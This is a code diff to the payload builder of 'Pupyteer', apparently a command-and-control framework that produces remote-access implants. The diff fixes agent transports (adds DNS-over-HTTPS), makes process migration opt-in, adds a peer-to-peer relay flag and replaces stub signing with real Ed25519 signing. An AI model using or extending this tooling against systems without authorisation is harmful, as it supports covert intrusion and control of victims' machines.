@@ -1,6 +1,7 @@
 """Pupyteer Payload Management System — Build, track, and manage payload artifacts."""
 from __future__ import annotations
 
+import base64
 import hashlib
 import json
 import logging
@@ -14,6 +15,10 @@ from datetime import datetime, timezone, timedelta
 from enum import Enum
 from pathlib import Path
 from typing import Any, Dict, List, Optional, Tuple
+
+from cryptography.exceptions import InvalidSignature
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
 
 from pupyteer._proc import creationflags
 from pupyteer.server.core.config import ConfigManager
@@ -84,7 +89,13 @@ VALID_PLATFORM_ARCH: Dict[PayloadPlatform, List[PayloadArch]] = {
     PayloadPlatform.ANDROID: [PayloadArch.ARM, PayloadArch.ARM64, PayloadArch.X86, PayloadArch.X64],
 }
 
-VALID_TRANSPORTS = {"tcp", "http", "https", "dns", "websocket"}
+# What the *agent* can actually dial (see make_transport() in the stub
+# template). `websocket` used to be listed here while the template raised
+# "Unknown transport: websocket" at startup, so a build validated, compiled and
+# handed back a payload that died on its first line. `doh` is implemented and is
+# advertised by `build-payload --transport`, but was missing from this set and so
+# was refused.
+VALID_TRANSPORTS = {"tcp", "http", "https", "dns", "doh"}
 # Transports with a listener the server can actually start. A payload built on
 # anything else runs, finds nobody, and the operator waits for a session that
 # never arrives — so the build refuses instead.
@@ -138,12 +149,16 @@ class PayloadConfig:
     # payloads.pe_rc4_key > config transports.rc4_key > off. Empty string is
     # the default and selects the plaintext wire (no RC4 framing).
     rc4_key: str = ""
-    # Process migration is compiled in by default, matching every payload built to
-    # date: it changes no on-target behaviour unless tasked, so leaving it on
-    # preserves current payloads. An operator can still pass migration=False for a
-    # smaller artifact that declares no `migrate` capability and answers a migrate
-    # tasking with "unknown action" rather than pretending.
-    migration: bool = True
+    # Process migration. Off by default, because what the agent can actually do
+    # is a partial step (it writes an image, it does not execute anything), and
+    # a payload that declares `migrate` and then answers a tasking with "ok"
+    # tells an operator the implant is somewhere it is not. Build with
+    # --migration to compile the handlers in; they report what they really did.
+    migration: bool = False
+    # Peer-to-peer relay listener. Off by default and, until now, unreachable:
+    # nothing on the build surface could turn it on, so the relay code could
+    # never run. `--relay` compiles it in.
+    relay: bool = False
     extra: Dict[str, Any] = field(default_factory=dict)
 
     def to_dict(self) -> Dict[str, Any]:
@@ -220,55 +235,150 @@ class PayloadMetadata:
 
 
 class PayloadSigner:
-    """Optional payload signing workflow stub for controlled environments.
+    """Ed25519 build attestation for payload artifacts.
 
-    In production, this would integrate with:
-    - Authenticode (Windows)
-    - GPG/signing services (Linux)
-    - APK signing (Android)
+    A signature nobody can check is decoration, so this produces a real
+    signature over the artifact bytes and can verify it again. The key lives at
+    ``payloads.signing.key_path`` (default ``./data/keys/payload_signing.key``,
+    mode 0600) and is generated on first use.
+
+    What it is *for*: proving which build produced an artifact and that it was
+    not modified between build and deployment. What it is *not*: the agent does
+    not verify it, so it is not supply-chain protection against a hostile build
+    host — an operator who controls that host controls the key.
     """
+
+    DEFAULT_KEY_PATH = "./data/keys/payload_signing.key"
 
     def __init__(self, config: ConfigManager, audit: AuditLogger):
         self._config = config
         self._audit = audit
         self._enabled = config.get("payloads.signing.enabled", False)
-        self._key_path = config.get("payloads.signing.key_path", "")
+        self._key_path = config.get("payloads.signing.key_path", "") or self.DEFAULT_KEY_PATH
 
     @property
     def enabled(self) -> bool:
         return self._enabled
+
+    @property
+    def key_path(self) -> str:
+        return self._key_path
+
+    def enable(self) -> None:
+        """Turn signing on for the build that asked for it."""
+        self._enabled = True
+
+    def _load_key(self) -> Optional[Any]:
+        path = Path(self._key_path)
+        if not path.exists():
+            return None
+        try:
+            return serialization.load_pem_private_key(path.read_bytes(), password=None)
+        except Exception as exc:  # a corrupt key must not silently re-key
+            self._audit.log_event("payload_signing_error", {"error": str(exc)})
+            return None
+
+    def _load_or_create_key(self) -> Tuple[Optional[Any], str]:
+        key = self._load_key()
+        if key is not None:
+            return key, "loaded"
+        path = Path(self._key_path)
+        path.parent.mkdir(parents=True, exist_ok=True)
+        key = Ed25519PrivateKey.generate()
+        path.write_bytes(key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.PKCS8,
+            encryption_algorithm=serialization.NoEncryption(),
+        ))
+        try:
+            os.chmod(path, 0o600)
+        except OSError:
+            pass
+        self._audit.log_event("payload_signing_key_created", {"key_path": str(path)})
+        return key, "created"
 
     def sign(self, artifact_path: str, payload_id: str) -> Tuple[bool, str]:
         """Sign an artifact. Returns (success, signature_path_or_error)."""
         if not self._enabled:
             return True, ""  # Signing disabled, treat as no-op success
 
-        if not self._key_path:
-            return False, "Signing enabled but no key_path configured"
-
         artifact = Path(artifact_path)
         if not artifact.exists():
             return False, f"Artifact not found: {artifact_path}"
 
-        # Stub: in production, invoke actual signing tool
+        key, how = self._load_or_create_key()
+        if key is None:
+            return False, f"Could not load or create a signing key at {self._key_path}"
+
+        data = artifact.read_bytes()
+        digest = hashlib.sha256(data).hexdigest()
+        public_raw = key.public_key().public_bytes(
+            encoding=serialization.Encoding.Raw,
+            format=serialization.PublicFormat.Raw,
+        )
         sig_path = artifact.with_suffix(artifact.suffix + ".sig")
         try:
-            # Placeholder: write a marker signature file
             sig_data = {
                 "payload_id": payload_id,
                 "signed_at": datetime.now(timezone.utc).isoformat(),
                 "key_path": self._key_path,
-                "algorithm": "ed25519-stub",
-                "artifact_hash": hashlib.sha256(artifact.read_bytes()).hexdigest(),
+                "algorithm": "ed25519",
+                "artifact_hash": digest,
+                "public_key_fingerprint": hashlib.sha256(public_raw).hexdigest()[:16],
+                "signature": base64.b64encode(key.sign(data)).decode(),
             }
             sig_path.write_text(json.dumps(sig_data, indent=2))
             self._audit.log_event("payload_signed", {
                 "payload_id": payload_id,
                 "signature_path": str(sig_path),
+                "key": how,
             })
             return True, str(sig_path)
         except Exception as e:
             return False, str(e)
+
+    def verify(self, artifact_path: str, sig_path: Optional[str] = None) -> Tuple[bool, str]:
+        """Check an artifact against its signature. Returns (ok, message)."""
+        artifact = Path(artifact_path)
+        if not artifact.exists():
+            return False, f"Artifact not found: {artifact_path}"
+
+        if sig_path is None:
+            sig_path = str(artifact.with_suffix(artifact.suffix + ".sig"))
+        sig_file = Path(sig_path)
+        if not sig_file.exists():
+            return False, f"Signature not found: {sig_path}"
+
+        try:
+            recorded = json.loads(sig_file.read_text())
+        except Exception as exc:
+            return False, f"Signature file is not readable JSON: {exc}"
+
+        algorithm = recorded.get("algorithm")
+        if algorithm != "ed25519":
+            return False, (
+                f"algorithm '{algorithm}' is a marker, not a signature — this "
+                "file attests nothing"
+            )
+
+        data = artifact.read_bytes()
+        digest = hashlib.sha256(data).hexdigest()
+        if digest != recorded.get("artifact_hash"):
+            return False, "artifact hash does not match the signature — it changed after signing"
+
+        key = self._load_key()
+        if key is None:
+            return False, f"Signing key not found at {self._key_path}"
+        try:
+            signature = base64.b64decode(recorded["signature"])
+            key.public_key().verify(signature, data)
+        except (KeyError, ValueError, InvalidSignature):
+            return False, "signature verification failed"
+
+        return True, (
+            f"ed25519 signature valid (key fingerprint "
+            f"{recorded.get('public_key_fingerprint')}, artifact {digest[:16]}...)"
+        )
 
 
 class PayloadBuilder:
@@ -550,6 +660,7 @@ class PayloadBuilder:
                         rc4_key=payload_config.rc4_key,
                         payload_id=payload_id,
                         sleep_mask=payload_config.sleep_mask,
+                        relay=payload_config.relay,
                     )
                     pe_result = await pe_build.build(stub_cfg, artifact_path.with_suffix('.exe'))
                     if pe_result.status == "built":
@@ -615,6 +726,7 @@ class PayloadBuilder:
                     rc4_key=payload_config.rc4_key,
                     payload_id=payload_id,
                     sleep_mask=payload_config.sleep_mask,
+                    relay=payload_config.relay,
                     extra={"agent_identity": identity} if identity else {},
                 )
                 agent_code = stub_gen.generate(stub_cfg)
@@ -670,13 +782,21 @@ class PayloadBuilder:
             metadata.artifact_path = str(artifact_path)
             build_log.append("Verification passed")
 
-            # Optional signing
-            if sign and self._signer.enabled:
+            # Optional signing. `--sign` is an explicit request, so it enables
+            # the signer for this build rather than silently doing nothing
+            # because the config flag happened to be off.
+            if sign:
+                self._signer.enable()
                 ok, sig_result = self._signer.sign(str(artifact_path), payload_id)
                 if ok:
                     metadata.signed = True
                     metadata.signature_path = sig_result
                     build_log.append(f"Signed: {sig_result}")
+                    verified, verify_msg = self._signer.verify(
+                        str(artifact_path), sig_result if sig_result else None)
+                    build_log.append(
+                        f"Signature check: {verify_msg}" if verified
+                        else f"Signature check FAILED: {verify_msg}")
                 else:
                     build_log.append(f"Signing failed: {sig_result}")
 
